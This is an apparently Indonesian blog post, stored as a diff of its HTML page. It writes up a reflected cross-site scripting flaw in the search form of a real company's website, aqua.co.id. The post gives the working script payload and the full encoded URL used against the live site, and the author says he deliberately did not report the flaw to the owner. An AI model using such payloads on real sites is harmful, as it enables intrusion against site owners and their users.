@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html><head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Cross Site Scripting on Aqua - Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Cross Site Scripting di website Aqua.co.id" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Cross Site Scripting on Aqua" />
+<meta property="og:description" content="Cross Site Scripting di website Aqua.co.id" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/xss-aqua/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-08-24T22:20:27+07:00" />
+<meta property="article:modified_time" content="2019-08-24T22:20:27+07:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cross Site Scripting on Aqua"/>
+<meta name="twitter:description" content="Cross Site Scripting di website Aqua.co.id"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.d902908ac6e0fab67957de5db5aea1b6455b19ae2ca98eac4c95a4a0fdc02238.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.c95c5dcf5f32f8b67bd36f7dab66680e068fce2b303087294114aabf7a7c080b.css" media="(prefers-color-scheme: dark)"  />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+	
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+		
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Beranda</a>
+		
+		<a href="/posts">Postingan</a>
+		
+		<a href="/about">Tentang</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Cross Site Scripting on Aqua</h1>
+			<div class="meta">Posted on Aug 24, 2019</div>
+		</div>
+		
+
+		<section class="body">
+			<p>Berjumpa lagi, masih bermain main dengan XSS, kali ini saya mendapat sebuah website bernama Aqua, ya pasti kalian pada tahu dong, Aqua adalah sebuah anak perusahaan dari <em>Danone</em> yang berjalan pada sentra air minum.
+<figure><img src="https://i.postimg.cc/pVg1bGqc/image.png"/><figcaption>
+            <h4>Logo Aqua</h4>
+        </figcaption>
+</figure>
+</p>
+<p>Kebetulan saya bekerja sebagai admin di sebuah CV yang bekerja sama dengan Aqua sebagai mitra utamanya. Kalian bisa mengunjungi website aqua.co.id untuk mendapatkan informasi lebih lanjut tentang perusahaan ini.</p>
+<p><em>Lho kok ga di laporkan aja lur?</em> Intinya saya males <strong>mereport</strong> bug seperti ini, endingnya hanya di anggap remeh saja sama mereka, kan kata <strong>mereka</strong> XSS hanya hal sepele hihi, jadi males aja gitu lur. Mending di WriteUP dan untuk saling share pengalaman.</p>
+<p>Oke menuju topik utama, setelah iseng mengunjungi halaman aqua.co.id saya mendapatkan from pencarian, nah disitu saya mendapat ide untuk melakukan XSS.</p>
+<figure><img src="https://i.postimg.cc/3JTCFPLh/image.png"/><figcaption>
+            <h4>Target injeksi script XSS</h4>
+        </figcaption>
+</figure>
+
+<p>Saya mencoba memasukkan <code>&quot;&gt;&lt;script&gt;alert(1337);&lt;/script&gt;</code> tetapi yang muncul halaman berikut, awalnya saya merasa gagal.
+<figure><img src="https://i.postimg.cc/Dwsh34rL/image.png"/>
+</figure>
+</p>
+<p>Lalu mencoba meremove search pada url dari :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">aqua</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">/</span><span style="color:#a6e22e">search</span><span style="color:#f92672">?</span><span style="color:#a6e22e">_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Pt6XdGZA2MyJqSY3RuT33O9ThJB0svRVqtiYE3Dn</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">query</span><span style="color:#f92672">=%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Cscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ealert</span><span style="color:#f92672">%</span><span style="color:#ae81ff">281337</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">Fscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span>
+</span></span></code></pre></div><p>menjadi</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">://</span><span style="color:#a6e22e">aqua</span><span style="color:#f92672">.</span><span style="color:#a6e22e">co</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span><span style="color:#f92672">/?</span><span style="color:#a6e22e">_token</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Pt6XdGZA2MyJqSY3RuT33O9ThJB0svRVqtiYE3Dn</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">query</span><span style="color:#f92672">=%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Cscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ealert</span><span style="color:#f92672">%</span><span style="color:#ae81ff">281337</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">Fscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span>
+</span></span></code></pre></div><p>Dan boom akhirnya muncul juga popup 1337 yang saya dambakan, cieeee….</p>
+<figure><img src="https://i.postimg.cc/9fns4WYC/image.png%22"/>
+</figure>
+
+<p>Tak lupa mencoba memunculkan <strong>prompt</strong> agar terdokumentasi bagi saya hehe.
+<figure><img src="https://i.postimg.cc/XqZKDbRN/XSS-aqua.png%22"/>
+</figure>
+</p>
+<p>Iseng lagi coba coba ternyata bisa render html juga.
+<figure><img src="https://i.postimg.cc/zfgFj81J/image.png%22"/>
+</figure>
+</p>
+<p>Sekian writeup dari saya, jika ada kesalahan kata saya minta maaf. Terima kasih</p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/pentest">pentest</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+	</article>
+</main>
+<footer >
+    <div style="display:flex"><a class="soc" href="https://github.com/tanmyid" rel="me" title="GitHub"><i data-feather="github"></i></a>
+      <a class="border"></a><a class="soc" href="https://twitter.com/athulcajay/" rel="me" title="Facebook"><i data-feather="facebook"></i></a>
+      <a class="border"></a><a class="soc" href="https://t.me/tanmyid" rel="me" title="Telegram"><i data-feather="send"></i></a>
+      <a class="border"></a></div>
+    <div class="footer-info">
+      <strong>[</strong>2023  © Tanio <strong>]</strong> 
+    </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
